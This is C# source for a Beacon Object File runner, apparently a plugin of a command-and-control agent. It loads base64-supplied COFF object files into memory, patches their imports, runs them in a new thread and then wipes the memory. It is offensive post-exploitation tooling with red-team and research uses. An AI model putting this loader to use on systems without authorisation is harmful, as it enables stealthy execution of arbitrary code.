#define _AMD64
using Plugins;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace coff.coff
{
    class BofRunner
    {
      //test
        private readonly Coff beacon_helper;
        private Coff bof;
        public IntPtr entry_point;
        private readonly IAT iat;
        public Dictionary<string, string> parsed_args;
        //public ParsedArgs parsed_args;
        //public BofRunner(ParsedArgs parsed_args)
        public BofRunner(Dictionary<string,string> parsed_args)
        {
            //Logger.Debug("Initialising bof runner");
            this.parsed_args = parsed_args;

            // first we need a basic IAT to hold function pointers
            // this needs to be done here so we can share it between our two object files
            this.iat = new IAT();

            // First init our beacon helper object file 
            // This has the code for things like BeaconPrintf, BeaconOutput etc.
            // It also has a wrapper for the bof entry point (go_wrapper) that allows us to pass arguments. 
            byte[] beacon_funcs;
            string[] resource_names = Assembly.GetExecutingAssembly().GetManifestResourceNames();

            if (resource_names.Contains("coff.coff.beacon_funcs.x64.o"))
            {
                var ms = new MemoryStream();
                Stream resStream = Assembly.GetExecutingAssembly().GetManifestResourceStream("coff.coff.beacon_funcs.x64.o");
                resStream.CopyTo(ms);
                beacon_funcs = ms.ToArray(); //Can these be merged?
            }
            else
            {
                throw new Exception("Unable to load beacon_funcs resource");
            }

            try
            {
                this.beacon_helper = new Coff(beacon_funcs, this.iat);

            }
            catch (Exception e)
            {
                throw e;
            }

            // Serialise the arguments we want to send to our object file
            // Find our helper functions and entry wrapper (go_wrapper)
            //this.entry_point = this.beacon_helper.ResolveHelpers(parsed_args.SerialiseArgs(), parsed_args.debug);
            this.entry_point = this.beacon_helper.ResolveHelpers(Athena.Utilities.Misc.Base64DecodeToByteArray(parsed_args["arguments"]), false);
            // this needs to be called after we've finished monkeying around with the BOF's memory
            this.beacon_helper.SetPermissions();

        }

        public void LoadBof()
        {
            // create new coff
            //this.bof = new Coff(this.parsed_args.file_bytes, this.iat);
            this.bof = new Coff(Athena.Utilities.Misc.Base64DecodeToByteArray(this.parsed_args["asm"]), this.iat);
            //Logger.Debug($"Loaded BOF with entry {this.entry_point.ToInt64():X}");
            // stitch up our go_wrapper and go functions
            this.bof.StitchEntry(this.parsed_args["functionName"]);

            this.bof.SetPermissions();
        }

        public BofRunnerOutput RunBof(uint timeout)
        {
            StringBuilder debug_output = new StringBuilder();
            IntPtr hThread = NativeDeclarations.CreateThread(IntPtr.Zero, 0, this.entry_point, IntPtr.Zero, 0, IntPtr.Zero);
            uint thread_timeout = 0;
            if (!uint.TryParse(this.parsed_args["timeout"], out thread_timeout)){
                thread_timeout = 60;
            }
            //var resp = NativeDeclarations.WaitForSingleObject(hThread, thread_timeout * 1000);
            var resp = NativeDeclarations.WaitForSingleObject(hThread, 86400 * 1000);

            if (resp == (uint)NativeDeclarations.WaitEventEnum.WAIT_TIMEOUT)
            {
                debug_output.AppendLine($"BOF timed out after {thread_timeout} seconds");
            }

            Console.Out.Flush();

            int ExitCode;

            NativeDeclarations.GetExitCodeThread(hThread, out ExitCode);


            if (ExitCode < 0)
            {
                debug_output.AppendLine($"Exited with code: {ExitCode}");
                //debug_output.AppendLine($"Bof thread exited with code {ExitCode} - see above for exception information. ");
            }


            // try reading from our shared buffer
            // the buffer may have moved (e.g. if realloc'd) so we need to get its latest address
            var output_addr = Marshal.ReadIntPtr(beacon_helper.global_buffer);
            // NB this is the size of the allocated buffer, not its contents, and we'll read all of its size - this may or may not be an issue depending on what is written
            var output_size = Marshal.ReadInt32(beacon_helper.global_buffer_size_ptr);

            //Logger.Debug($"Output buffer size {output_size} located at {output_addr.ToInt64():X}");

            List<byte> output = new List<byte>();

            byte c;
            int i = 0;
            while ((c = Marshal.ReadByte(output_addr + i)) != '\0' && i < output_size)
            {
                output.Add(c);
                i++;
            }

            // Now cleanup all memory...

            BofRunnerOutput Response = new BofRunnerOutput();

            debug_output.AppendLine(Encoding.ASCII.GetString(output.ToArray()));
            //Response.Output = Encoding.ASCII.GetString(output.ToArray());
            Response.Output = debug_output.ToString();
            Response.ExitCode = ExitCode;

            //Clear the bof from memory
            ClearMemory();

            return Response;

        }

        private void ClearMemory()
        {
            /* things that need cleaning up:
                - beacon_funcs BOF
                - the bof we ran
                - all of our input/output buffers
                - our IAT table
            */
            // this.beacon_helper.base_addr, t
            this.beacon_helper.Clear();
            this.bof.Clear();
            this.iat.Clear();

        }
    }

    class BofRunnerOutput
    {
        internal string Output;
        internal int ExitCode;
    }
}